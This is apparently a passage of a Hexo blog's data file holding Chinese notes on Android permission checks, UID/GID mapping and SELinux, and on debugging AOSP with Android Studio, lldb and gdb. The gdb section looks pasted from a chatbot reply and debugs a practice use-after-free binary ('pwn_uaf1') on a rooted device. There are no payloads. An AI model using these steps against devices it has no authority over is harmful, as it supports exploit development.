IDreamManager.Stub.asInterface(ServiceManager.checkService(DreamService.DREAM_SERVICE));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Override</span> <span class=\"comment\">//Binder call</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">awaken</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  checkPermission(android.Manifest.permission.WRITE_DREAM_STATE);</span><br><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">ident</span> <span class=\"operator\">=</span> Binder.clearCallingIdentity();</span><br><span class=\"line\">  <span class=\"keyword\">try</span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkPermission</span><span class=\"params\">(String permission)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mContext.checkCallingOrSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;Access denied to process: &quot;</span> + Binder.getCallingPid()+<span class=\"string\">&quot;, must have permission &quot;</span> + permission);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<blockquote>\n<p>生产代码建议：在 <strong>Binder 端（服务实现）</strong>做二次校验（<code>checkCallingPermission()</code> / <code>enforceCallingPermission()</code>），避免调用方绕过客户端封装直接发起 IPC。</p>\n</blockquote>\n<h2 id=\"Android的运行是权限控制方式：映射为OS的特定属性\"><a href=\"#Android的运行是权限控制方式：映射为OS的特定属性\" class=\"headerlink\" title=\"Android的运行是权限控制方式：映射为OS的特定属性\"></a>Android的运行是权限控制方式：映射为OS的特定属性</h2><ul>\n<li>非Android特有的Service（底层平台已经提供，如File访问，TCPIP数据首发等）</li>\n<li>多个入口访问：Android API , Java API ,NDK C API ,Shell ,etc</li>\n<li>底层控制准则，会聚口在底层，所以在底层（OS层面）统一控制，这样可以避免逃逸控制</li>\n<li>所以复用OS的一些安全控制特性，比如GID</li>\n<li>所以需要把Android空间的Permission Mapping到OS的GID</li>\n<li>例子：访问SDCard<br>sdcard目录下的文件权限如下所示：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">外部存储挂载示例（不同设备存在差异）</span></span><br><span class=\"line\">marlin:/ $ ls -l /storage</span><br><span class=\"line\">total 8</span><br><span class=\"line\">drwx--x--x 3 root sdcard_rw 4096 2025-09-01 21:59 emulated</span><br><span class=\"line\">drwxr-xr-x 2 root root        60 1974-12-07 14:35 self</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进程通过所属 GID（如 sdcard_rw / media_rw）与 FUSE/SDCardFS/FS-verity 等层配合受控访问</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"Android的Permission与UID-GID的mapping\"><a href=\"#Android的Permission与UID-GID的mapping\" class=\"headerlink\" title=\"Android的Permission与UID/GID的mapping\"></a>Android的Permission与UID/GID的mapping</h2><h1 id=\"Android-专题补充（2025）\"><a href=\"#Android-专题补充（2025）\" class=\"headerlink\" title=\"Android 专题补充（2025）\"></a>Android 专题补充（2025）</h1><h2 id=\"AID-与多用户-UID-计算\"><a href=\"#AID-与多用户-UID-计算\" class=\"headerlink\" title=\"AID 与多用户 UID 计算\"></a>AID 与多用户 UID 计算</h2><ul>\n<li><code>appId</code> 从 10000 起分配；多用户下 <code>uid = userId * 100000 + appId</code>。</li>\n<li>典型系统 AID：<code>AID_SYSTEM=1000</code>、<code>AID_RADIO=1001</code>、<code>AID_BLUETOOTH=1002</code>、<code>AID_GRAPHICS=1003</code> 等（详见 <code>android_filesystem_config.h</code>）。</li>\n</ul>\n<h2 id=\"SELinux（SEAndroid）要点\"><a href=\"#SELinux（SEAndroid）要点\" class=\"headerlink\" title=\"SELinux（SEAndroid）要点\"></a>SELinux（SEAndroid）要点</h2><ul>\n<li>强制访问控制（MAC）默认 <strong>Enforcing</strong>；检查：<code>getenforce</code>。</li>\n<li>App 进程运行在诸如 <code>u:object_r:app_data_file:s0:cXX,cYY</code>（文件）与 <code>u:r:untrusted_app:s0:cXX,cYY</code>（进程域）之下；越权访问由策略阻断。</li>\n<li>调试常用：<code>adb shell dmesg | grep avc:</code>、<code>adb logcat | grep denied</code> 定位策略拒绝。</li>\n</ul>\n<h2 id=\"调试与自检清单\"><a href=\"#调试与自检清单\" class=\"headerlink\" title=\"调试与自检清单\"></a>调试与自检清单</h2><ul>\n<li>查看进程身份与能力：<code>ps -eo pid,ruid,euid,rgid,egid,user,comm</code>; <code>cat /proc/$PID/status</code>。</li>\n<li>查看签名方案与证书：<code>apksigner verify -v --print-certs your.apk</code>。</li>\n<li>遵循现代权限：优先 Photo Picker / MediaStore；声明 <code>queries</code>；细化 FGS 类型；声明 PendingIntent 可变性；最小权限原则。</li>\n</ul>\n"},{"_content":"Android Studio导入源码相关\n1、编译\nsource lunch\n mmm development/tools/idegen/\nsh ./development/tools/idegen/idegen.sh\n生成的产物有android.ipr , android.iml\n\n2、使用Android Studio打开android.ipr之前的配置\n\n可更改下文件权限，chmod 777等\nadnroid.ipr: Android Studio打开选择此文件\n\nandroid.iml: 用来描述modules，一般只看framework相关代码，可将其他无用modules exclude掉，减少index时间\n\n在android.iml中加入excludeFolder  exclude_modules\n\n3、配置SDKs\n通过右击project的 根节点，选择“open module settings”打开\n\n先Java SDK（删除class path），再Android API（删除source path）\n![alt text](../pic/javasdk.png)\n\n4、删除不必要的依赖\n\n只保留<Module source>和Android API Platform即可\n![alt text](../pic/module_source.png)\n5、可将framebases目录添加为目录依赖，如上图\n\n注意，frameworks 要在Module Source上面，要不然代码可能会跳到生成目录的文件里\n\n6、在Project视图中点击设置按钮，取消勾选Show Exclude Files\n\n7、导航条中 File→ Settings → Version Control 中删除不必要的目录管理，保留fw和 fw\n\n\n## android.bp讲解\nhttps://gityuan.com/2018/06/02/android-bp/\n\n源码调试：\nhttps://www.cnblogs.com/yongfengnice/p/18246075\n\n打开文件/etc/sysctl.conf，在这个文件加入一行：\n\nfs.inotify.max_user_watches=524288\n保存文件后执行：\n\nsudo sysctl -p\n\n最后可以执行：\n\ncat /proc/sys/fs/inotify/max_user_watches\n\n来检查这个值是否被成功修改了。\n2 增加Android Studio的堆内存\n使用Android Studio浏览这么大的项目会存在堆内存不够的问题。\n\n在Android Studio中点击File → Settings → Appearance & Behavior → System Settings → Memory Settings，将其中所有heap size调到最大然后点击ok。\n3 编译idegen模块\ncd 源码目录\n\nsource build/envsetup.sh\n\nlunch 机型名-userdebug\n\n如果没有编译过任何模块：\n\nmake idegen -j12\n\n或\n\nmmm development/tools/idegen -j12\n\n如果编译过任何模块（参考增量编译单个模块）：\n\nninjabuild idegen -j12\n4 生成android.ipr和android.iml文件\n编译完成后执行：\n\n./development/tools/idegen/idegen.sh\n\n执行完成可以看到在源码目录出现了android.ipr和android.iml文件\n\nandroid.iml文件中包括了太多的源码目录和jar包，如果此时直接用Android Studio打开ipr文件，扫描会非常耗时。通常如果只看framework层代码，只需要扫描framewroks, miui, packages, tools这几个目录就够了，并且jar包也是完全不需要的。而直接手动修改android.iml文件又十分麻烦，因此我写了一个python脚本来处理。\n执行完成后即完成了对android.iml文件的删减，在我的Ubuntu主机上实测可以将后面的3个小时扫描时间缩短到10分钟。\n\n最近经常碰到执行idegen.sh脚本卡死的情况，目前的解决方案是按ctrl+c取消执行脚本，然后将其它项目的android.ipr和android.iml文件复制到源码目录使用即可，这里提供一份已经完成裁剪的android.ipr和android.iml文件：\n5 用Android Studio打开项目\n在Android Studio中点File → Open选择刚刚生成的android.ipr文件；\n\n等待右下角的文件扫描任务完成就可以看代码并且可以有代码跳转了。\n\n如果你之前没有执行过cutiml.py脚本，此时代码跳转会跳到.class文件里面而不是.java文件中，修复方法：\n\n点击File → Project Structure... → Modules → Dependencies将这里面的jar包全部删除然后点击OK。\n\n6 调试安卓源码\n在Android Studio中点File → Project Structure... → Project → Project SDK选择Android API XX Platform，其中XX与你的安卓版本一致，例如R版本就是30。（如果在这里没有选择Android SDK会导致Android Studio中不显示连接的设备）\n\n调试方法：\n\n1 插入手机并打开USB调试；\n\n2 在需要调试的代码中打断点；\n\n3 点击Attach Debugger to Android Process看到Choose Process对话框出现；（点击按钮没反应不出现对话框的修复方法：点击Add Configuration...然后点击左上角的+，选择Android App并点击OK）\n\n4 勾选Show all processes；\n\n5 选择要调试的进程然后点击OK即可开始调试。（注：这里system_process就是SystemServer进程）\n\nhttps://juejin.cn/post/7139773823116640263\n## lldb 调试servicemanager\n\n在Android Studio中，你可以使用LLDB调试器来调试ServiceManager。以下是一些步骤和注意事项：\n设备\n```\n$ adb push lldb-server /data/local/tmp/\n$ adb shell \n$ cd /data/local/tmp\n$ chmod 755 lldb-server\n$ ./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock\n```\nlldb\n```\n(lldb) platform select remote-android \n(lldb) platform connect unix-abstract-connect:///data/local/tmp/debug.sock\n(lldb) file out/target/product/marlin/symbols/system/bin/servicemanager\n\n(lldb) target modules search-paths add /system /home/nuoen/aosp/out/target/product/marlin/symbols/system\n(lldb) process attach --pid 477\n```\n启动\n(lldb) process launch --stdin /dev/stdin --working-dir /data/local/tmp\n## gdb 调试\n当然可以，以下是一个适用于你的环境的 GDB 远程调试 Android 64 位程序（如 pwn_uaf1）的完整流程文档，支持传递参数、查看符号和断点调试。\n\n⸻\n\n📘 GDB 远程调试 Android 64-bit 程序完整流程文档\n\n🧾 前提要求\n\t•\tAndroid 设备已 root\n\t•\t已将编译好的 pwn_uaf1 推送到 /data/local/tmp/\n\t•\t使用的是 64 位 ARM ELF（aarch64）\n\t•\t主机安装了 gdb-multiarch，或使用 Android NDK 提供的 aarch64-linux-android-gdb\n\t•\t主机与 Android 可使用 adb 通信\n\n⸻\n\n🧱 文件结构假设\n\n~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1           # 主机上的可执行文件（带符号）\n/data/local/tmp/pwn_uaf1                             # 推送到 Android 上执行的 ELF\n\n\n\n⸻\n\n🧰 步骤一：推送目标程序到 Android\n\nadb push ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1 /data/local/tmp/\nadb shell chmod +x /data/local/tmp/pwn_uaf1\n\n\n\n⸻\n\n🧰 步骤二：在 Android 上启动 gdbserver（带参数）\n\nadb shell\ncd /data/local/tmp\n./gdbserver64 :1234 ./pwn_uaf1 1 test_input.txt\n\n\t•\t:1234 是监听端口\n\t•\t1 test_input.txt 是程序所需参数\n\n✅ 输出应该看到：\n\nProcess ./pwn_uaf1 created; pid = xxxx\nListening on port 1234\n\n\n\n⸻\n\n🧰 步骤三：主机上设置端口转发\n\nadb forward tcp:1234 tcp:1234\n\n\n\n⸻\n\n🧰 步骤四：启动 GDB 并连接到目标\n\n方法 A：使用系统安装的 gdb-multiarch（适合 Ubuntu）\n\ngdb-multiarch ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1\n\n方法 B：使用 Android NDK 自带 GDB（推荐）\n\ncd $NDK/toolchains/llvm/prebuilt/linux-x86_64/aarch64-linux-android/debugger-bin\n./aarch64-linux-android-gdb ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1\n\n\n\n⸻\n\n🧰 步骤五：在 GDB 内连接并调试\n\ntarget remote :1234       # 连接设备\nfile ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1  # 加载符号\nbreak main                # 设置断点\ncontinue                  # 运行程序\n\n\n\n⸻\n\n✅ 交互调试中支持：\n\t•\tnext / step：逐句调试\n\t•\tprint var：打印变量\n\t•\tinfo registers：查看寄存器\n\t•\t手动输入 1\\n、2\\n：程序会接收到（stdin 有效）\n\n⸻\n\n⚠️ 注意事项\n\n问题\t原因\n连接后立刻断开\t架构不匹配，请确保是 aarch64，不要设为 arm\nReply contains invalid hex digit\t使用的是不兼容版本的 GDB 或 gdbserver，请用 NDK 中的版本\n传参不生效\t必须在 Android 上执行 gdbserver 时传参，不能在 GDB 启动命令中传参\n无法交互输入\t如果你不是用 gdbserver 启动程序而是 attach 的方式，stdin 可能无效\n\n\n\n⸻\n\n📎 一键脚本模板（可选）\n\n#!/bin/bash\nadb push pwn_uaf1 /data/local/tmp/\nadb shell chmod +x /data/local/tmp/pwn_uaf1\nadb forward tcp:1234 tcp:1234\nadb shell \"cd /data/local/tmp && ./gdbserver64 :1234 ./pwn_uaf1 arg1 arg2\" &\nsleep 2\ngdb-multiarch pwn_uaf1 -ex \"target remote :1234\"\n\n\n\n⸻\n\n是否还需要我附带一个 .gdbinit 模板来自动设置符号、连接和断点？","source":"_drafts/aosp.md","raw":"Android Studio导入源码相关\n1、编译\nsource lunch\n mmm development/tools/idegen/\nsh ./development/tools/idegen/idegen.sh\n生成的产物有android.ipr , android.iml\n\n2、使用Android Studio打开android.ipr之前的配置\n\n可更改下文件权限，chmod 777等\nadnroid.ipr: Android Studio打开选择此文件\n\nandroid.iml: 用来描述modules，一般只看framework相关代码，可将其他无用modules exclude掉，减少index时间\n\n在android.iml中加入excludeFolder  exclude_modules\n\n3、配置SDKs\n通过右击project的 根节点，选择“open module settings”打开\n\n先Java SDK（删除class path），再Android API（删除source path）\n![alt text](../pic/javasdk.png)\n\n4、删除不必要的依赖\n\n只保留<Module source>和Android API Platform即可\n![alt text](../pic/module_source.png)\n5、可将framebases目录添加为目录依赖，如上图\n\n注意，frameworks 要在Module Source上面，要不然代码可能会跳到生成目录的文件里\n\n6、在Project视图中点击设置按钮，取消勾选Show Exclude Files\n\n7、导航条中 File→ Settings → Version Control 中删除不必要的目录管理，保留fw和 fw\n\n\n## android.bp讲解\nhttps://gityuan.com/2018/06/02/android-bp/\n\n源码调试：\nhttps://www.cnblogs.com/yongfengnice/p/18246075\n\n打开文件/etc/sysctl.conf，在这个文件加入一行：\n\nfs.inotify.max_user_watches=524288\n保存文件后执行：\n\nsudo sysctl -p\n\n最后可以执行：\n\ncat /proc/sys/fs/inotify/max_user_watches\n\n来检查这个值是否被成功修改了。\n2 增加Android Studio的堆内存\n使用Android Studio浏览这么大的项目会存在堆内存不够的问题。\n\n在Android Studio中点击File → Settings → Appearance & Behavior → System Settings → Memory Settings，将其中所有heap size调到最大然后点击ok。\n3 编译idegen模块\ncd 源码目录\n\nsource build/envsetup.sh\n\nlunch 机型名-userdebug\n\n如果没有编译过任何模块：\n\nmake idegen -j12\n\n或\n\nmmm development/tools/idegen -j12\n\n如果编译过任何模块（参考增量编译单个模块）：\n\nninjabuild idegen -j12\n4 生成android.ipr和android.iml文件\n编译完成后执行：\n\n./development/tools/idegen/idegen.sh\n\n执行完成可以看到在源码目录出现了android.ipr和android.iml文件\n\nandroid.iml文件中包括了太多的源码目录和jar包，如果此时直接用Android Studio打开ipr文件，扫描会非常耗时。通常如果只看framework层代码，只需要扫描framewroks, miui, packages, tools这几个目录就够了，并且jar包也是完全不需要的。而直接手动修改android.iml文件又十分麻烦，因此我写了一个python脚本来处理。\n执行完成后即完成了对android.iml文件的删减，在我的Ubuntu主机上实测可以将后面的3个小时扫描时间缩短到10分钟。\n\n最近经常碰到执行idegen.sh脚本卡死的情况，目前的解决方案是按ctrl+c取消执行脚本，然后将其它项目的android.ipr和android.iml文件复制到源码目录使用即可，这里提供一份已经完成裁剪的android.ipr和android.iml文件：\n5 用Android Studio打开项目\n在Android Studio中点File → Open选择刚刚生成的android.ipr文件；\n\n等待右下角的文件扫描任务完成就可以看代码并且可以有代码跳转了。\n\n如果你之前没有执行过cutiml.py脚本，此时代码跳转会跳到.class文件里面而不是.java文件中，修复方法：\n\n点击File → Project Structure... → Modules → Dependencies将这里面的jar包全部删除然后点击OK。\n\n6 调试安卓源码\n在Android Studio中点File → Project Structure... → Project → Project SDK选择Android API XX Platform，其中XX与你的安卓版本一致，例如R版本就是30。（如果在这里没有选择Android SDK会导致Android Studio中不显示连接的设备）\n\n调试方法：\n\n1 插入手机并打开USB调试；\n\n2 在需要调试的代码中打断点；\n\n3 点击Attach Debugger to Android Process看到Choose Process对话框出现；（点击按钮没反应不出现对话框的修复方法：点击Add Configuration...然后点击左上角的+，选择Android App并点击OK）\n\n4 勾选Show all processes；\n\n5 选择要调试的进程然后点击OK即可开始调试。（注：这里system_process就是SystemServer进程）\n\nhttps://juejin.cn/post/7139773823116640263\n## lldb 调试servicemanager\n\n在Android Studio中，你可以使用LLDB调试器来调试ServiceManager。以下是一些步骤和注意事项：\n设备\n```\n$ adb push lldb-server /data/local/tmp/\n$ adb shell \n$ cd /data/local/tmp\n$ chmod 755 lldb-server\n$ ./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock\n```\nlldb\n```\n(lldb) platform select remote-android \n(lldb) platform connect unix-abstract-connect:///data/local/tmp/debug.sock\n(lldb) file out/target/product/marlin/symbols/system/bin/servicemanager\n\n(lldb) target modules search-paths add /system /home/nuoen/aosp/out/target/product/marlin/symbols/system\n(lldb) process attach --pid 477\n```\n启动\n(lldb) process launch --stdin /dev/stdin --working-dir /data/local/tmp\n## gdb 调试\n当然可以，以下是一个适用于你的环境的 GDB 远程调试 Android 64 位程序（如 pwn_uaf1）的完整流程文档，支持传递参数、查看符号和断点调试。\n\n⸻\n\n📘 GDB 远程调试 Android 64-bit 程序完整流程文档\n\n🧾 前提要求\n\t•\tAndroid 设备已 root\n\t•\t已将编译好的 pwn_uaf1 推送到 /data/local/tmp/\n\t•\t使用的是 64 位 ARM ELF（aarch64）\n\t•\t主机安装了 gdb-multiarch，或使用 Android NDK 提供的 aarch64-linux-android-gdb\n\t•\t主机与 Android 可使用 adb 通信\n\n⸻\n\n🧱 文件结构假设\n\n~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1           # 主机上的可执行文件（带符号）\n/data/local/tmp/pwn_uaf1                             # 推送到 Android 上执行的 ELF\n\n\n\n⸻\n\n🧰 步骤一：推送目标程序到 Android\n\nadb push ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1 /data/local/tmp/\nadb shell chmod +x /data/local/tmp/pwn_uaf1\n\n\n\n⸻\n\n🧰 步骤二：在 Android 上启动 gdbserver（带参数）\n\nadb shell\ncd /data/local/tmp\n./gdbserver64 :1234 ./pwn_uaf1 1 test_input.txt\n\n\t•\t:1234 是监听端口\n\t•\t1 test_input.txt 是程序所需参数\n\n✅ 输出应该看到：\n\nProcess ./pwn_uaf1 created; pid = xxxx\nListening on port 1234\n\n\n\n⸻\n\n🧰 步骤三：主机上设置端口转发\n\nadb forward tcp:1234 tcp:1234\n\n\n\n⸻\n\n🧰 步骤四：启动 GDB 并连接到目标\n\n方法 A：使用系统安装的 gdb-multiarch（适合 Ubuntu）\n\ngdb-multiarch ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1\n\n方法 B：使用 Android NDK 自带 GDB（推荐）\n\ncd $NDK/toolchains/llvm/prebuilt/linux-x86_64/aarch64-linux-android/debugger-bin\n./aarch64-linux-android-gdb ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1\n\n\n\n⸻\n\n🧰 步骤五：在 GDB 内连接并调试\n\ntarget remote :1234       # 连接设备\nfile ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1  # 加载符号\nbreak main                # 设置断点\ncontinue                  # 运行程序\n\n\n\n⸻\n\n✅ 交互调试中支持：\n\t•\tnext / step：逐句调试\n\t•\tprint var：打印变量\n\t•\tinfo registers：查看寄存器\n\t•\t手动输入 1\\n、2\\n：程序会接收到（stdin 有效）\n\n⸻\n\n⚠️ 注意事项\n\n问题\t原因\n连接后立刻断开\t架构不匹配，请确保是 aarch64，不要设为 arm\nReply contains invalid hex digit\t使用的是不兼容版本的 GDB 或 gdbserver，请用 NDK 中的版本\n传参不生效\t必须在 Android 上执行 gdbserver 时传参，不能在 GDB 启动命令中传参\n无法交互输入\t如果你不是用 gdbserver 启动程序而是 attach 的方式，stdin 可能无效\n\n\n\n⸻\n\n📎 一键脚本模板（可选）\n\n#!/bin/bash\nadb push pwn_uaf1 /data/local/tmp/\nadb shell chmod +x /data/local/tmp/pwn_uaf1\nadb forward tcp:1234 tcp:1234\nadb shell \"cd /data/local/tmp && ./gdbserver64 :1234 ./pwn_uaf1 arg1 arg2\" &\nsleep 2\ngdb-multiarch pwn_uaf1 -ex \"target remote :1234\"\n\n\n\n⸻\n\n是否还需要我附带一个 .gdbinit 模板来自动设置符号、连接和断点？","slug":"aosp","published":0,"date":"2024-10-13T10:25:19.085Z","updated":"2025-05-06T14:25:13.386Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risy0006v8fy6ij0gu4f","content":"<p>Android Studio导入源码相关<br>1、编译<br>source lunch<br> mmm development/tools/idegen/<br>sh ./development/tools/idegen/idegen.sh<br>生成的产物有android.ipr , android.iml</p>\n<p>2、使用Android Studio打开android.ipr之前的配置</p>\n<p>可更改下文件权限，chmod 777等<br>adnroid.ipr: Android Studio打开选择此文件</p>\n<p>android.iml: 用来描述modules，一般只看framework相关代码，可将其他无用modules exclude掉，减少index时间</p>\n<p>在android.iml中加入excludeFolder  exclude_modules</p>\n<p>3、配置SDKs<br>通过右击project的 根节点，选择“open module settings”打开</p>\n<p>先Java SDK（删除class path），再Android API（删除source path）<br><img src=\"../pic/javasdk.png\" alt=\"alt text\"></p>\n<p>4、删除不必要的依赖</p>\n<p>只保留<Module source>和Android API Platform即可<br><img src=\"../pic/module_source.png\" alt=\"alt text\"><br>5、可将framebases目录添加为目录依赖，如上图</p>\n<p>注意，frameworks 要在Module Source上面，要不然代码可能会跳到生成目录的文件里</p>\n<p>6、在Project视图中点击设置按钮，取消勾选Show Exclude Files</p>\n<p>7、导航条中 File→ Settings → Version Control 中删除不必要的目录管理，保留fw和 fw</p>\n<h2 id=\"android-bp讲解\"><a href=\"#android-bp讲解\" class=\"headerlink\" title=\"android.bp讲解\"></a>android.bp讲解</h2><p><a href=\"https://gityuan.com/2018/06/02/android-bp/\">https://gityuan.com/2018/06/02/android-bp/</a></p>\n<p>源码调试：<br><a href=\"https://www.cnblogs.com/yongfengnice/p/18246075\">https://www.cnblogs.com/yongfengnice/p/18246075</a></p>\n<p>打开文件/etc/sysctl.conf，在这个文件加入一行：</p>\n<p>fs.inotify.max_user_watches=524288<br>保存文件后执行：</p>\n<p>sudo sysctl -p</p>\n<p>最后可以执行：</p>\n<p>cat /proc/sys/fs/inotify/max_user_watches</p>\n<p>来检查这个值是否被成功修改了。<br>2 增加Android Studio的堆内存<br>使用Android Studio浏览这么大的项目会存在堆内存不够的问题。</p>\n<p>在Android Studio中点击File → Settings → Appearance &amp; Behavior → System Settings → Memory Settings，将其中所有heap size调到最大然后点击ok。<br>3 编译idegen模块<br>cd 源码目录</p>\n<p>source build/envsetup.sh</p>\n<p>lunch 机型名-userdebug</p>\n<p>如果没有编译过任何模块：</p>\n<p>make idegen -j12</p>\n<p>或</p>\n<p>mmm development/tools/idegen -j12</p>\n<p>如果编译过任何模块（参考增量编译单个模块）：</p>\n<p>ninjabuild idegen -j12<br>4 生成android.ipr和android.iml文件<br>编译完成后执行：</p>\n<p>./development/tools/idegen/idegen.sh</p>\n<p>执行完成可以看到在源码目录出现了android.ipr和android.iml文件</p>\n<p>android.iml文件中包括了太多的源码目录和jar包，如果此时直接用Android Studio打开ipr文件，扫描会非常耗时。通常如果只看framework层代码，只需要扫描framewroks, miui, packages, tools这几个目录就够了，并且jar包也是完全不需要的。而直接手动修改android.iml文件又十分麻烦，因此我写了一个python脚本来处理。<br>执行完成后即完成了对android.iml文件的删减，在我的Ubuntu主机上实测可以将后面的3个小时扫描时间缩短到10分钟。</p>\n<p>最近经常碰到执行idegen.sh脚本卡死的情况，目前的解决方案是按ctrl+c取消执行脚本，然后将其它项目的android.ipr和android.iml文件复制到源码目录使用即可，这里提供一份已经完成裁剪的android.ipr和android.iml文件：<br>5 用Android Studio打开项目<br>在Android Studio中点File → Open选择刚刚生成的android.ipr文件；</p>\n<p>等待右下角的文件扫描任务完成就可以看代码并且可以有代码跳转了。</p>\n<p>如果你之前没有执行过cutiml.py脚本，此时代码跳转会跳到.class文件里面而不是.java文件中，修复方法：</p>\n<p>点击File → Project Structure… → Modules → Dependencies将这里面的jar包全部删除然后点击OK。</p>\n<p>6 调试安卓源码<br>在Android Studio中点File → Project Structure… → Project → Project SDK选择Android API XX Platform，其中XX与你的安卓版本一致，例如R版本就是30。（如果在这里没有选择Android SDK会导致Android Studio中不显示连接的设备）</p>\n<p>调试方法：</p>\n<p>1 插入手机并打开USB调试；</p>\n<p>2 在需要调试的代码中打断点；</p>\n<p>3 点击Attach Debugger to Android Process看到Choose Process对话框出现；（点击按钮没反应不出现对话框的修复方法：点击Add Configuration…然后点击左上角的+，选择Android App并点击OK）</p>\n<p>4 勾选Show all processes；</p>\n<p>5 选择要调试的进程然后点击OK即可开始调试。（注：这里system_process就是SystemServer进程）</p>\n<p><a href=\"https://juejin.cn/post/7139773823116640263\">https://juejin.cn/post/7139773823116640263</a></p>\n<h2 id=\"lldb-调试servicemanager\"><a href=\"#lldb-调试servicemanager\" class=\"headerlink\" title=\"lldb 调试servicemanager\"></a>lldb 调试servicemanager</h2><p>在Android Studio中，你可以使用LLDB调试器来调试ServiceManager。以下是一些步骤和注意事项：<br>设备</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ adb push lldb-server /data/local/tmp/</span><br><span class=\"line\">$ adb shell </span><br><span class=\"line\">$ cd /data/local/tmp</span><br><span class=\"line\">$ chmod 755 lldb-server</span><br><span class=\"line\">$ ./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n<p>lldb</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(lldb) platform select remote-android </span><br><span class=\"line\">(lldb) platform connect unix-abstract-connect:///data/local/tmp/debug.sock</span><br><span class=\"line\">(lldb) file out/target/product/marlin/symbols/system/bin/servicemanager</span><br><span class=\"line\"></span><br><span class=\"line\">(lldb) target modules search-paths add /system /home/nuoen/aosp/out/target/product/marlin/symbols/system</span><br><span class=\"line\">(lldb) process attach --pid 477</span><br></pre></td></tr></table></figure>\n<p>启动<br>(lldb) process launch –stdin /dev/stdin –working-dir /data/local/tmp</p>\n<h2 id=\"gdb-调试\"><a href=\"#gdb-调试\" class=\"headerlink\" title=\"gdb 调试\"></a>gdb 调试</h2><p>当然可以，以下是一个适用于你的环境的 GDB 远程调试 Android 64 位程序（如 pwn_uaf1）的完整流程文档，支持传递参数、查看符号和断点调试。</p>\n<p>⸻</p>\n<p>📘 GDB 远程调试 Android 64-bit 程序完整流程文档</p>\n<p>🧾 前提要求<br>    •    Android 设备已 root<br>    •    已将编译好的 pwn_uaf1 推送到 /data/local/tmp/<br>    •    使用的是 64 位 ARM ELF（aarch64）<br>    •    主机安装了 gdb-multiarch，或使用 Android NDK 提供的 aarch64-linux-android-gdb<br>    •    主机与 Android 可使用 adb 通信</p>\n<p>⸻</p>\n<p>🧱 文件结构假设</p>\n<p>~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1           # 主机上的可执行文件（带符号）<br>/data/local/tmp/pwn_uaf1                             # 推送到 Android 上执行的 ELF</p>\n<p>⸻</p>\n<p>🧰 步骤一：推送目标程序到 Android</p>\n<p>adb push ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1 /data/local/tmp/<br>adb shell chmod +x /data/local/tmp/pwn_uaf1</p>\n<p>⸻</p>\n<p>🧰 步骤二：在 Android 上启动 gdbserver（带参数）</p>\n<p>adb shell<br>cd /data/local/tmp<br>./gdbserver64 :1234 ./pwn_uaf1 1 test_input.txt</p>\n<pre><code>•    :1234 是监听端口\n•    1 test_input.txt 是程序所需参数\n</code></pre>\n<p>✅ 输出应该看到：</p>\n<p>Process ./pwn_uaf1 created; pid = xxxx<br>Listening on port 1234</p>\n<p>⸻</p>\n<p>🧰 步骤三：主机上设置端口转发</p>\n<p>adb forward tcp:1234 tcp:1234</p>\n<p>⸻</p>\n<p>🧰 步骤四：启动 GDB 并连接到目标</p>\n<p>方法 A：使用系统安装的 gdb-multiarch（适合 Ubuntu）</p>\n<p>gdb-multiarch ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1</p>\n<p>方法 B：使用 Android NDK 自带 GDB（推荐）</p>\n<p>cd $NDK/toolchains/llvm/prebuilt/linux-x86_64/aarch64-linux-android/debugger-bin<br>./aarch64-linux-android-gdb ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1</p>\n<p>⸻</p>\n<p>🧰 步骤五：在 GDB 内连接并调试</p>\n<p>target remote :1234       # 连接设备<br>file ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1  # 加载符号<br>break main                # 